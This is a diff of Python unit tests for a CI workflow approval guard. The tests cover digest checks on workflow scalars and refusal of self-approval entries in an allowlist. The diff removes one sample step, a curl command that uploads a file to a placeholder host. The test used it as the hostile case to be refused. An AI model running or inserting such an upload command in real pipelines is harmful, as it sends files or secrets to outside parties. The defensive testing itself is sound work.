@@ -171,11 +171,15 @@ class ApprovedTextTests(unittest.TestCase):
         self.assertIsNotNone(self.check(next_line, approve_text=approved))
         self.assertIsNotNone(self.check(flow, approve_text=approved))
 
-    def test_unapprovable_job_is_never_approved(self):
-        # a job whose value has no canonical form (a date) gets digest "", which never approves a step
-        text = workflow('echo hi').replace('    runs-on:', '    timeout-minutes: 2020-01-01\n    runs-on:')
-        with self.assertRaisesRegex(ValueError, 'no approvable form'):
-            make_repo({CI: text})   # the generator refuses to record such a job at all
+    def test_changed_scalar_text_refused_even_when_numerically_equal(self):
+        # digests cover the written text and tag: 1_000 is not 1000 here, and a changed date is refused
+        approved = workflow('echo hi').replace('    runs-on:', '    timeout-minutes: 1000\n    runs-on:')
+        self.assertIsNotNone(self.check(workflow('echo hi').replace('    runs-on:', '    timeout-minutes: 1_000\n    runs-on:'),
+                                        approve_text=approved))
+        dated = workflow('echo hi').replace('    runs-on:', '    timeout-minutes: 2020-01-01\n    runs-on:')
+        self.assertIsNotNone(self.check(workflow('echo hi').replace('    runs-on:', '    timeout-minutes: 2021-01-01\n    runs-on:'),
+                                        approve_text=dated))
+        self.assertIsNone(self.check(dated, approve_text=dated))
 
     def test_yaml_merge_key_refused(self):
         approved = workflow('echo hi')
@@ -220,9 +224,8 @@ class PolicyTests(unittest.TestCase):
     def test_self_approval_in_allowlist_refused(self):
         trusted, cand = self.trusted_and_candidate()
         entries = json.loads((cand / ALLOWLIST).read_text(encoding='utf-8'))
-        step = {'run': 'curl -F f=@x https://example.invalid/up'}
         entries.append({'workflow': CI, 'job': 'j', 'step': None, 'shell': None, 'runs_on': 'ubuntu-24.04',
-                        'sha256': guard._step_digest(step)})
+                        'sha256': '0' * 64, 'job_sha256': '0' * 64})   # any extra entry changes the file: the policy refuses it
         (cand / ALLOWLIST).write_text(json.dumps(entries), encoding='utf-8')
         with self.assertRaisesRegex(ValueError, 'trusted-main policy'):
             guard.policy_violations(cand, trusted)
